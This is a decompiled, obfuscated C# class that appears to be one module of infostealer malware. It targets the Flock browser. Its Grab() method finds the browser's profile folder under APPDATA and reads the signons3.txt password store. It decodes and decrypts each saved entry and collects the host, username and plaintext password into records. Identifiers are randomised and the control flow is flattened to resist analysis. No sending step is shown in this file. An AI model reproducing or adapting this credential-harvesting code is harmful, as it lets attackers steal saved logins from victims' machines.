using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using SNt;
using c1SUVJC;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class j7Hl7I4J : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string tECi4Cr1XdY
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public j7Hl7I4J()
	{
		tECi4Cr1XdY = "Flock Browser";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string[] array = default;
		List<ii68> list = default;
		do
		{
			if (num == 2)
			{
				array = MRw.pw7TE(Environment.GetEnvironmentVariable("APPDATA") + "\\Flock\\Browser\\");
				num = 3;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		try
		{
			string[] array2 = array;
			foreach (string text in array2)
			{
				string path = text + "signons3.txt";
				if (!File.Exists(path))
				{
					return list;
				}
				string text2 = File.ReadAllText(path);
				int count = Regex.Matches(text2, Regex.Escape("---")).Count;
				byte[] array3 = MRw.GM8tFfpx6(text);
				if (array3 == null)
				{
					return list;
				}
				for (int j = 0; j <= count - 1; j++)
				{
					string[] array4 = b4v.jCFtRv(text2, Environment.NewLine + "." + Environment.NewLine, "---", j).Split(new string[1] { Environment.NewLine }, StringSplitOptions.None);
					string host = array4[0];
					string text3 = array4[1];
					npb7IanTN npb7IanTN2 = new npb7IanTN();
					i0E9 i0E10 = npb7IanTN2.ncGMtyBS(Convert.FromBase64String(array4[4]));
					byte[] data = i0E10.eWOcOb[0].eWOcOb[1].eWOcOb[1].WCJJ6;
					byte[] data2 = i0E10.eWOcOb[0].eWOcOb[2].WCJJ6;
					string text4 = _3VzYbXLJt4.fOLl(data2, array3, data);
					if (!string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4))
					{
						list.Add(new ii68
						{
							byIdLuuGZbL = host,
							S8v = text3,
							_9H5rP7hg2 = text4,
							oVAe = tECi4Cr1XdY
						});
					}
				}
			}
			return list;
		}
		catch
		{
			return new List<ii68>();
		}
	}
}
